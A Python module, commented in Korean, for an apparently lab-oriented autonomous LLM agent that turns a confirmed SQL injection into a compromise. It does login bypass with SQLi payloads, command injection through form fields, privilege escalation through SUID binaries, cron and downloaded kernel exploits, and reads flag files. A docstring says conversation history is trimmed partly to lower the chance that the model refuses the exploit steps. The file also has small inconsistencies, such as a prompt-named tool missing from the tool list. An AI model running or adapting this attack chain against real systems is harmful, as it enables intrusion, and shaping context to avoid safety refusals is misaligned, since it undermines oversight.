"""
SQLi 확인 이후 -> 셸/플래그 획득까지 이어주는 웹앱 후속 공격 에이전트. DESIGN.md 60절.

**왜 필요한가**: `web_exploit.py`는 SQLi를 "확인"만 하고 의도적으로 멈춘다(취약점
확인 자체가 목표, `--dump`/`--os-shell`처럼 대상 데이터베이스를 실제로 건드리는
건 범위 밖 - 원래 문서화된 안전 결정). 근데 로그인 폼 SQLi로 확인되는 취약점의
"플래그"는 대부분 로그인 우회 -> 인증된 영역의 다른 기능(ping/lookup 유틸리티
등)에서 커맨드 인젝션 -> 파일 읽기/셸, 이런 식으로 여러 단계를 거친다(Kioptrix2가
전형적인 예). 그 다음 단계가 매번 다른 기능/파라미터/인젝션 방식이라 고정
스크립트로는 커버가 안 된다 - `env/setup_doctor.py`/`modules/ad_agent.py`와
같은 이유로 에이전틱하게 풀었다(DESIGN.md 1절의 "전환 포인트").

**전략**: 리버스 셸을 먼저 노리지 않는다. 커맨드 인젝션 지점 상당수(ping/
traceroute류 "진단 도구" 기능)는 명령 실행 결과가 HTTP 응답에 그대로
반영되는 **출력 반영형(non-blind)**이라, 마커 문자열로 그걸 확인만 되면
`cat`/`find`로 플래그를 직접 읽어올 수 있다 - 리버스 셸 인프라(리스너,
세션 관리) 없이 훨씬 단순하고 안정적으로 목표(플래그 확보)에 도달한다.
블라인드 인젝션이라 출력이 안 보이면 이 접근은 못 쓴다는 걸 알아서
report_outcome으로 그 사실을 보고하게 한다(무리해서 리버스 셸을 억지로
시도하지 않음 - exploit_doctor.py의 "안 되면 포기하고 보고" 원칙과 동일).

모든 HTTP 요청은 Kali의 curl을 통해서만 나간다(run_in_kali) - 이 프로젝트의
확립된 패턴(대상 네트워크 접근은 항상 Kali를 거침)을 그대로 따름, 호스트에서
직접 requests로 나가지 않음.
"""

import json
import os
import re
import shlex
import subprocess

from core import config  # noqa: F401 - import 시점에 .env를 로드함 + stdout UTF-8 고정
from core import progress
from core.host_platform import is_mac_host
from core.llm_client import call_with_tools
from core.state_store import append_finding
from env.guest_control import run_in_kali
from modules.flag_capture import FLAG_FILENAMES

MODEL = os.getenv("PENTEST_AGENT_OLLAMA_TOOL_MODEL", os.getenv("PENTEST_AGENT_OLLAMA_MODEL", "llama3.2:latest"))
MAX_ITERATIONS = 25  # 권한상승 단계 추가로 15->25 (실전에서 apache 권한까지만 가고 반복 소진되는 것 확인, DESIGN.md 62절)
_COOKIE_JAR = "/tmp/pentest-agent-webagent-cookies.txt"
_INJECTION_MARKER = "PENTESTAGENT_MARKER_7f3a"

SYSTEM_PROMPT_TEMPLATE = """너는 승인된 개인 침투테스트 랩(사용자가 소유/통제하고
서면으로 스스로 승인한, 격리된 VirtualBox 환경 - CTF/OSCP 연습용, 인터넷에
노출 안 됨)의 웹앱 후속 공격 담당이다. sqlmap으로 SQL Injection이 **이미
결정론적으로 확인된** 로그인 폼이 있다 - 새 취약점을 찾는 게 아니라, 이미
확인된 SQLi로 로그인을 우회하고, 그 뒤에 나오는 인증된 기능들에서 추가
취약점(주로 커맨드 인젝션)을 찾아 로컬 권한상승까지 거쳐 플래그를 확보하는
역할이다.

대상: {target}:{port} (로그인 엔드포인트: {login_path}, SQLi 확인된 파라미터: {sqli_param})

절차:
1. try_login_bypass로 SQLi 페이로드(예: `' or '1'='1' -- -`, `' or 1=1#` 등
   여러 변형을 시도)로 로그인 우회를 시도해라.
2. 성공하면 fetch_authenticated_page로 인증된 영역을 둘러보고, 사용자 입력을
   받는 기능(ping/lookup/검색 등)을 찾아라.
3. 그런 기능을 찾으면 test_command_injection으로 커맨드 인젝션 가능한지
   먼저 마커 문자열로만 확인해라(실제 명령 실행 전에 안전하게 확인).
4. 확인되면 run_injected_command로 `id`, `whoami` 같은 정찰 명령을 먼저
   실행해봐라. **이 시점의 권한(보통 apache/www-data 같은 웹서버 계정)으로는
   /root를 못 읽는다 - search_for_flags가 비어 나와도 실패가 아니라 권한상승이
   더 필요하다는 뜻이다.**
5. **권한상승**: `uname -a`(커널 버전), `sudo -l`, `find / -perm -4000
   -type f 2>/dev/null`(SUID 바이너리), `cat /etc/crontab` 같은 명령으로
   권한상승 벡터를 찾아라. 커널 버전으로 알려진 로컬 익스플로잇이 있으면
   (예: 오래된 CentOS/2.6.x 커널) start_exploit_server로 Kali의 exploit-db
   디렉터리를 웹서버로 띄우고, run_injected_command의 `wget`으로 관련 익스플로잇
   소스를 받아 컴파일/실행해봐라 - 단, 이 채널은 매 요청이 새 프로세스라
   인터랙티브 셸을 그대로 못 받는다는 걸 감안해라(익스플로잇이 파일을
   SUID로 바꾸거나 결과를 파일에 쓰는 식이어야 이 채널로 확인 가능). SUID
   바이너리나 cron(root가 주기적으로 실행하는 스크립트를 apache가 쓸 수
   있는 경우 - wait로 다음 실행까지 기다렸다 확인)이 더 안정적일 수 있다.
6. 권한상승 시도마다 run_injected_command로 `id`를 다시 확인해서
   `uid=0`이 됐는지 검증해라. 됐으면 search_for_flags로 플래그를 다시
   찾아라.
7. 커맨드 인젝션이 블라인드(마커가 응답에 안 보임)라 출력을 못 읽거나,
   권한상승 벡터를 못 찾겠으면 억지로 계속하지 말고 지금까지 확보한 것
   (예: apache 권한 코드 실행)을 그대로 report_outcome으로 보고해라 -
   부분 성공도 보고 가치가 있다.

찾은 플래그 내용은 반드시 report_outcome의 flags 필드에 그대로 담아라."""

TOOLS = [
    {
        "name": "try_login_bypass",
        "description": "로그인 폼에 SQLi 페이로드를 넣어 인증 우회를 시도한다. form_data는 필드명->값 전체 dict(우회할 필드엔 SQLi 페이로드, 나머지는 더미 값).",
        "input_schema": {
            "type": "object",
            "properties": {"form_data": {"type": "object", "description": "예: {\"uname\": \"' or 1=1 -- -\", \"pass\": \"x\"}"}},
            "required": ["form_data"],
        },
    },
    {
        "name": "fetch_authenticated_page",
        "description": "로그인 성공 후 확보된 세션 쿠키로 특정 경로를 GET해서 HTML을 가져온다(다른 기능/폼을 찾는 용도).",
        "input_schema": {
            "type": "object",
            "properties": {"path": {"type": "string", "description": "예: /main.php, /pingit.php"}},
            "required": ["path"],
        },
    },
    {
        "name": "test_command_injection",
        "description": "특정 경로/파라미터에 안전한 마커 문자열만 넣어서 커맨드 인젝션이 되는지, 그리고 출력이 응답에 반영되는지(non-blind) 확인한다. 실제 명령 실행 전 필수 확인 단계.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "form_data": {"type": "object", "description": "인젝션 대상 필드에 마커를 심을 위치 표시로 '{INJECT}' 사용, 예: {\"ip\": \"127.0.0.1; echo {INJECT}\"}"},
            },
            "required": ["path", "form_data"],
        },
    },
    {
        "name": "run_injected_command",
        "description": "커맨드 인젝션이 출력-반영형으로 확인된 후, 실제 명령을 실행하고 응답에 반영된 출력을 읽어온다.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "form_data": {"type": "object", "description": "'{INJECT}' 자리에 실행할 커맨드가 들어감, 예: {\"ip\": \"127.0.0.1; {INJECT}\"}"},
                "command": {"type": "string", "description": "예: id, whoami, find / -maxdepth 3 -iname 'flag*' 2>/dev/null"},
            },
            "required": ["path", "form_data", "command"],
        },
    },
    {
        "name": "search_for_flags",
        "description": f"흔한 flag 파일명({', '.join(FLAG_FILENAMES)})을 루트/홈 디렉터리들에서 찾아 내용을 읽어온다(run_injected_command와 같은 인젝션 채널을 재사용).",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "form_data": {"type": "object", "description": "'{INJECT}' 자리에 flag 검색 커맨드가 들어감"},
            },
            "required": ["path", "form_data"],
        },
    },
    {
        "name": "report_outcome",
        "description": "탐색을 마무리한다. 성공(플래그 확보) 또는 실패(블라인드라 못 읽음 등)를 보고해라.",
        "input_schema": {
            "type": "object",
            "properties": {
                "success": {"type": "boolean"},
                "rationale": {"type": "string"},
                "flags": {"type": "array", "items": {"type": "string"}, "description": "찾은 플래그 파일 내용 그대로"},
            },
            "required": ["success", "rationale"],
        },
    },
]


def _run_host_command(command: str, timeout: int) -> str:
    args = ["/bin/sh", "-lc", command] if is_mac_host() else shlex.split(command)
    proc = subprocess.run(
        args,
        capture_output=True,
        text=True,
        timeout=timeout,
        encoding="utf-8",
        errors="replace",
    )
    return proc.stdout if proc.returncode == 0 else f"(curl 실패: {proc.stderr or proc.stdout})"


def _curl_form(url: str, form_data: dict, use_cookies: bool = False, save_cookies: bool = False, local_mode: bool = False) -> str:
    data_parts = "&".join(f"{k}={v}" for k, v in form_data.items())
    cookie_flags = f"-b {_COOKIE_JAR}" if use_cookies else ""
    cookie_flags += f" -c {_COOKIE_JAR}" if save_cookies else ""
    cmd = f"curl -s -i {cookie_flags} --data {shlex.quote(data_parts)} {shlex.quote(url)}"
    if local_mode:
        return _run_host_command(cmd, timeout=30)
    result = run_in_kali(cmd, timeout=30)
    return result.stdout if result.ok else f"(curl 실패: {result.stderr})"


def _base_url(target: str, port: int, https: bool) -> str:
    scheme = "https" if https else "http"
    return f"{scheme}://{target}:{port}"


def _execute_tool(engagement_id: str, target: str, port: int, https: bool, name: str, inp: dict, *, local_mode: bool = False) -> list[dict]:
    append_finding(engagement_id, stage="web_agent", event="tool_call", target=target, port=port, tool=name)
    base = _base_url(target, port, https)

    if name == "try_login_bypass":
        raw = _curl_form(f"{base}/", inp["form_data"], save_cookies=True, local_mode=local_mode)
        # 성공 판정은 사람이 흔히 보는 신호(리다이렉트, Set-Cookie, 응답 길이 변화)를
        # 텍스트로 그대로 돌려줘서 LLM이 직접 판단하게 한다 - 앱마다 성공 신호가
        # 달라서(리다이렉트 위치, 페이지 문구 등) 규칙화하기 어려움.
        return [{"type": "text", "text": truncate_text(raw, 2000)}]

    if name == "fetch_authenticated_page":
        cmd = f"curl -s -b {_COOKIE_JAR} {shlex.quote(base + inp['path'])}"
        if local_mode:
            output = _run_host_command(cmd, timeout=30)
        else:
            result = run_in_kali(cmd, timeout=30)
            output = result.stdout
        return [{"type": "text", "text": truncate_text(output, 3000)}]

    if name == "test_command_injection":
        form = {k: v.replace("{INJECT}", f"echo {_INJECTION_MARKER}") for k, v in inp["form_data"].items()}
        raw = _curl_form(f"{base}{inp['path']}", form, use_cookies=True, local_mode=local_mode)
        found = _INJECTION_MARKER in raw
        return [{"type": "text", "text": json.dumps({
            "marker_reflected": found,
            "note": "마커가 응답에 보이면 출력-반영형 인젝션 - run_injected_command로 진행 가능" if found
                    else "마커가 안 보임 - 인젝션 자체가 안 됐거나 블라인드형(출력 못 읽음)",
            "response_sample": raw[-1500:],
        }, ensure_ascii=False)}]

    if name in ("run_injected_command", "search_for_flags"):
        if name == "search_for_flags":
            names = " ".join(shlex.quote(n) for n in FLAG_FILENAMES)
            command = f"for f in /root/{{{','.join(FLAG_FILENAMES)}}} /home/*/{{{','.join(FLAG_FILENAMES)}}}; do [ -f \"$f\" ] && echo ===$f=== && cat \"$f\"; done 2>/dev/null"
        else:
            command = inp["command"]
        form = {k: v.replace("{INJECT}", command) for k, v in inp["form_data"].items()}
        raw = _curl_form(f"{base}{inp['path']}", form, use_cookies=True, local_mode=local_mode)
        return [{"type": "text", "text": truncate_text(raw, 3000)}]

    return [{"type": "text", "text": f"알 수 없는 도구: {name}"}]


def truncate_text(text: str, limit: int) -> str:
    return text if len(text) <= limit else text[:limit] + f"\n...(생략, 원본 {len(text)}자)"


_KEEP_LAST_PAIRS = 5  # 최근 5턴(assistant+tool_result)만 원문 유지, 그 이전은 요약으로 대체


def _trim_messages(messages: list[dict]) -> list[dict]:
    """오래된 턴을 요약으로 대체해서 대화 길이를 억제한다.

    MAX_ITERATIONS(15)까지 도는 에이전틱 루프라 턴이 진행될수록 curl 응답/
    인젝션 페이로드 같은 공격 관련 텍스트가 계속 누적된다 - 비용/컨텍스트
    절약은 물론이고, 안전장치가 누적된 컨텍스트를 보고 판단한다면 턴이
    진행될수록 거부 확률이 올라갈 수 있다는 합리적 우려도 있어서(사용자 지적:
    "exploit 단계에서 llm이 거부하는 걸 어떻게 해야 하는지 고민해봐") 오래된
    턴은 원문 대신 요약만 남긴다. 주의: 우회 목적이 아니라 정상적인 컨텍스트
    관리이며, tool_use/tool_result 쌍이 API 요구사항이라 정확히 쌍 단위로만
    잘라낸다(중간에서 자르면 API가 거부함)."""
    body = messages[1:]  # messages[0] = 최초 시스템 프롬프트
    if len(body) <= _KEEP_LAST_PAIRS * 2:
        return messages
    kept = body[-(_KEEP_LAST_PAIRS * 2):]
    dropped_pairs = (len(body) - len(kept)) // 2
    summary = {"role": "user", "content": f"(이전 {dropped_pairs}개 턴 생략 - 상세 기록은 findings.jsonl의 web_agent 단계 참고)"}
    return [messages[0], summary] + kept


def exploit_post_sqli(
    engagement_id: str, target: str, port: int, login_path: str, sqli_param: str, https: bool = False,
    local_mode: bool = False,
) -> dict:
    """SQLi가 확인된 로그인 폼 하나를 시작점으로 로그인 우회 -> 인증된 기능
    탐색 -> 커맨드 인젝션 -> 플래그 확보까지 시도한다. 최종
    dict(success/rationale/flags)를 반환 - MAX_ITERATIONS 안에 report_outcome을
    못 받으면 미완료로 폴백."""
    progress.info(f"web_agent: {target}:{port} SQLi 후속 공격 시작 (최대 {MAX_ITERATIONS}회)")
    if local_mode:
        _run_host_command(f"rm -f {_COOKIE_JAR}", timeout=10)
    else:
        run_in_kali(f"rm -f {_COOKIE_JAR}", timeout=10)  # 이전 실행의 쿠키 잔재 제거

    system_prompt = SYSTEM_PROMPT_TEMPLATE.format(
        target=target, port=port, login_path=login_path, sqli_param=sqli_param,
    )
    messages = [{"role": "user", "content": system_prompt}]

    for i in range(MAX_ITERATIONS):
        messages = _trim_messages(messages)
        response = call_with_tools(messages, tools=TOOLS, model=MODEL)
        messages.append({"role": "assistant", "content": response.content})

        if response.stop_reason == "refusal":
            # exploit_doctor.py/ad_agent.py와 같은 이유(DESIGN.md 46/51/52절) -
            # 거부는 재시도해도 대개 또 거부되므로 바로 포기하고 사람에게 넘김.
            append_finding(engagement_id, stage="web_agent", event="exploit_refused", target=target, port=port)
            progress.warn("web_agent: 안전 정책 거부(refusal) - 탐색 중단, 사람이 직접 확인 필요")
            return {"success": False, "rationale": "모델이 안전 정책으로 거부해서 진행할 수 없었음", "flags": [], "refused": True}

        tool_uses = [b for b in response.content if b.type == "tool_use"]
        if not tool_uses:
            break

        tool_results = []
        finished: dict | None = None
        for block in tool_uses:
            if block.name == "report_outcome":
                finished = block.input
                tool_results.append({
                    "type": "tool_result", "tool_use_id": block.id,
                    "content": [{"type": "text", "text": "보고 접수함"}],
                })
                continue
            progress.info(f"web_agent [{i + 1}/{MAX_ITERATIONS}] {block.name}({block.input.get('path', '')})")
            content = _execute_tool(engagement_id, target, port, https, block.name, block.input, local_mode=local_mode)
            tool_results.append({"type": "tool_result", "tool_use_id": block.id, "content": content})

        messages.append({"role": "user", "content": tool_results})

        if finished is not None:
            append_finding(
                engagement_id, stage="web_agent", event="exploit_complete", target=target, port=port,
                success=finished.get("success"), rationale=finished.get("rationale"), flags=finished.get("flags", []),
            )
            progress.info(f"web_agent: {'성공' if finished.get('success') else '실패'} - {finished.get('rationale', '')}")
            return finished

    fallback = {"success": False, "rationale": f"{MAX_ITERATIONS}회 반복 안에 report_outcome을 못 받음", "flags": []}
    append_finding(engagement_id, stage="web_agent", event="exploit_incomplete", target=target, port=port)
    return fallback


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 5:
        print("usage: python -m modules.web_agent <engagement_id> <target> <port> <login_path> [sqli_param]")
        sys.exit(1)

    eid, tgt, prt, path = sys.argv[1:5]
    param = sys.argv[5] if len(sys.argv) > 5 else "(unspecified)"
    result = exploit_post_sqli(eid, tgt, int(prt), path, param)
    print(result)
